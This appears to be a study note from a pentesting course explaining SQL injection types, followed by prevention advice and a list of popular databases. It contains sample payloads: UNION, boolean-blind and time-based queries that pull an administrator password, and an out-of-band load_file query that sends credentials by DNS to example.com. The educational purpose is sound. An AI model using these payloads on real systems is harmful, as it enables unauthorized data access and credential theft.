# What is SQL Injection (SQLi)?
* SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

* In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

<img src="https://github.com/pentest-khoa-02/TheMinh/blob/main/Week%207/images/1.png" width="666px" align="center">

* A successful SQL injection attack can result in unauthorized access to sensitive data, such as:
    * Passwords.

    * Credit card details.

    * Personal user information.

* SQL injection attacks have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

# Where does it occur in the web?
* SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.

* Look at the following example which creates a SELECT statement by adding a variable (txtUserId) to a select string. The variable is fetched from user input (getRequestString):

```js
txtUserId = getRequestString("UserId");
txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
```

* Most SQL injection vulnerabilities occur within the **WHERE clause of a SELECT query**. Most experienced testers are familiar with this type of SQL injection.

* However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
    * **In UPDATE** statements, within the updated values or the WHERE clause.
    * **In INSERT** statements, within the inserted values.
    * In SELECT statements, within the table or column name.
    * In SELECT statements, within the ORDER BY clause.

# How many types of SQLi?
* There are three types of SQL Injection attacks: **In-band SQLi, Inferential SQLi (Blind SQLi), Out-of-band SQLi**

## In-band SQLi
* In-band SQL injection is a type of SQL injection where the attacker receives the result as a direct response using the same communication channel. For example, if the attacker performs the attack manually using a web browser, the result of the attack will be displayed in the same web browser. In-band SQL injection is also called classic SQL injection.

* In-band SQLi is divided into two main types: **Error-based SQLi, Union-based SQLi**

### Error-based SQLi
* Error-based SQL injection is a subtype of in-band SQL injection where the result returned to the attacker is a database error string.

* Let’s say we have the same query as in the example above:

```sql
SELECT * FROM users WHERE user_id = 'current_user'
```

* A malicious hacker may provide the following current_user value: **1'**

* As a result, the query becomes:

```sql
SELECT * FROM users WHERE user_id = '1''
```

* The doubled single quote at the end of the query causes the database to report an error. If the web server is configured to display errors on screen, the attacker may see a message such as the following:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/query.php on line 37
```

As a result, the attacker immediately sees that the application is using a MySQL database and can focus on MySQL-specific attacks.

### Union-based SQLi
* Union-based SQL injection is a subtype of in-band SQL injection where the attacker uses the UNION SQL clause to receive a result that combines legitimate information with sensitive data.

* **Union-based SQL injection is the most dangerous type of SQL injection** because it lets the attacker directly obtain almost any information from the database.

* Let’s say we have the same query as in the example above:

```sql
SELECT * FROM users WHERE user_id = 'current_user'
```

* A malicious hacker may provide the following current_user:

```text
-1' UNION SELECT version(),current_user()--'
```

* As a result, the query becomes:

```sql
SELECT * FROM users WHERE user_id = '-1' UNION SELECT version(),current_user()--'
```

* The version and current_user functions in MySQL return the database version and the name of the current operating system user. As a result, the attacker receives the following information:

```text
5.1.73-0ubuntu0.10.04.1
mysql@localhost
```

The attacker immediately sees that the application is using a MySQL 5.1.73 database on the operating system Ubuntu 10.04.1 and that the database is accessed using the operating system user account mysql.

## Inferential SQLi (Blind SQLi)
* Inferential SQLi or Blind SQL injection is a type of SQL injection where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application. Blind SQL injection is also called inferential SQL injection.

* There are two types of blind SQL injections: **Boolean-based blind SQLi and Time-based blind SQLi**

### Boolean-based blind SQLi
* Boolean-based blind SQL injection is a subtype of blind SQL injection where the attacker observes the behavior of the database server and the application after combining legitimate queries with malicious data using boolean operators.

* Let’s assume that the following query is meant to display details of a product from the database.

```sql
SELECT * FROM products WHERE id = product_id
```

* At first, a malicious hacker uses the application in a legitimate way to discover at least one existing product ID – in this example, it’s product 42. Then, they can provide the following two values for product_id:

```text
42 AND 1=1
42 AND 1=0
```

* If this query is executed in the application using simple string concatenation, the query becomes respectively:

```sql
SELECT * FROM products WHERE id = 42 and 1=1
SELECT * FROM products WHERE id = 42 and 1=0
```

* If the application behaves differently in each case, it is susceptible to boolean-based blind SQL injections.

* For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

* This returns the True message, indicating that the injected condition is true, and so the first character of the password is greater than m.

* Next, we send the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

* This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

* Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

* We can continue this process to systematically determine the full password for the Administrator user.

### Time-based blind SQLi
* Time-based blind SQL injection is a subtype of blind SQL injection where the attacker observes the behavior of the database server and the application after combining legitimate queries with SQL commands that cause time delays.

* If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

* In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

* The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* The first of these inputs does not trigger a delay, because the condition 1=2 is false.
The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
Using this technique, we can retrieve data by testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

## Out-of-band SQLi
* Out-of-band SQL injection (OOB SQLi) is a type of SQL injection where the attacker does not receive a response from the attacked application on the same communication channel but instead is able to cause the application to send data to a remote endpoint that they control.

* Out-of-band SQL injection is only possible if the server that you are using has commands that trigger DNS or HTTP requests. However, that is the case with all popular SQL servers.

* Let’s say the attacker is able to execute the following SQL query in the target database:

```sql
SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))
```

* This will cause the application to send a DNS request to the domain database_version.database_user.database_password.example.com, exposing sensitive data (database version, user name, and the user’s password) to the attacker.

# How to Prevent SQL Injections (SQLi)
* Preventing SQL Injection vulnerabilities is not easy. Specific prevention techniques depend on the subtype of SQLi vulnerability, on the SQL database engine, and on the programming language. However, there are certain general strategic principles that you should follow to keep your web application safe.

## Don’t trust any user input
* Treat all user input as untrusted. Any user input that is used in an SQL query introduces a risk of an SQL Injection. Treat input from authenticated and/or internal users the same way that you treat public input.

## Use whitelists, not blacklists
* Don’t filter user input based on blacklists. A clever attacker will almost always find a way to circumvent your blacklist. If possible, verify and filter user input using strict whitelists only.

## Adopt the latest technologies
* Older web development technologies don’t have SQLi protection. Use the latest version of the development environment and language and the latest technologies associated with that environment/language. For example, in PHP use PDO instead of MySQLi.

## Employ verified mechanisms
* Don’t try to build SQLi protection from scratch. Most modern development technologies can offer you mechanisms to protect against SQLi. Use such mechanisms instead of trying to reinvent the wheel. For example, use parameterized queries or stored procedures.

## Scan regularly with Security testing tools
* SQL Injections may be introduced by your developers or through external libraries/modules/software. You should regularly scan your web applications using a web vulnerability scanner such as Acunetix, sqlmap,..

# Top 10 Databases Powering Modern Technology
1. Oracle Database:
    * Purpose: Developed by Oracle Corporation, it provides a scalable and high-performance platform for managing structured and unstructured data.

    * Use Cases: Widely used in enterprise applications, financial systems, and e-commerce platforms.

    * Pros: Robust, reliable, excellent security features, comprehensive tools for data management and analysis.

    * Cons: High licensing costs, complex setup and maintenance.
2. MySQL:
    * Purpose: An open-source relational database management system (RDBMS) that offers ease of use and flexibility.

    * Use Cases: Ideal for web applications, content management systems, and data-driven software.

    * Pros: Easy to set up, high performance, strong community support, cost-effective.

    * Cons: Limited scalability, lacks some advanced features.
3. Microsoft SQL Server:
    * Purpose: Developed by Microsoft, it is a feature-rich and scalable RDBMS for managing and analyzing large datasets.

    * Use Cases: Widely used in enterprise-level applications, data warehousing, and business intelligence.

    * Pros: Excellent integration with Microsoft products, strong security features, robust reporting and analysis tools.

    * Cons: Limited cross-platform compatibility, higher licensing costs for advanced features.
4. PostgreSQL:
    * Purpose: A powerful open-source object-relational database system known for its extensibility and reliability.

    * Use Cases: Suitable for a wide range of applications, including data analysis, geospatial data, and scientific research.

    * Pros: Highly extensible, strong community support, supports complex queries and transactions.

    * Cons: Requires more technical expertise, lacks built-in replication and backup tools.
5. MongoDB:
    * Purpose: A NoSQL document database designed to provide scalability, flexibility, and high performance for modern applications.

    * Use Cases: Well-suited for real-time analytics, content management systems, and mobile app backends.

    * Pros: Flexible schema, scalable, easily handles semi-structured and unstructured data, fast queries.

    * Cons: Not suitable for complex transactions, limited support for joins and relationships.
6. Cassandra:
    * Purpose: A highly scalable and distributed NoSQL database that excels in handling large amounts of data across multiple servers.

    * Use Cases: Ideal for time-series data, messaging platforms, and Internet of Things (IoT) applications.

    * Pros: Massive scalability, fault-tolerant, supports high write and read throughput, decentralized architecture.

    * Cons: Complex data modeling, eventual consistency may require additional effort.
7. Redis:
    * Purpose: An in-memory data structure store that offers high performance, low latency, and various data structures.

    * Use Cases: Caching, real-time analytics, message brokers, and session management.

    * Pros: Extremely fast, supports multiple data structures, versatile and flexible.

    * Cons: Limited storage capacity, persistence options require additional configuration.
8. Amazon DynamoDB:
    * Purpose: A fully managed NoSQL database service provided by Amazon Web Services (AWS) for applications requiring high scalability and low latency.

    * Use Cases: Popular in serverless architectures, gaming, and mobile applications.

    * Pros: Easy scalability, fully managed, seamless integration with other AWS services.

    * Cons: Higher cost for high-volume workloads, limited querying capabilities.
9. Neo4j:
    * Purpose: A graph database designed to efficiently store and traverse relationships between entities, making it ideal for complex data representations.

    * Use Cases: Graph-based applications, social networks, fraud detection, recommendation engines.

    * Pros: Powerful graph querying capabilities, highly performant for complex relationships.

    * Cons: Less suitable for traditional tabular data, limited horizontal scalability.
10. SQLite:
    * Purpose: A self-contained, serverless, and zero-configuration SQL database engine, ideal for small-scale applications and embedded systems.

    * Use Cases: Mobile apps, IoT devices, simple web applications.

    * Pros: Lightweight, no installation or administration required, ACID-compliant.

    * Cons: Limited scalability, less suitable for high-concurrency workloads.
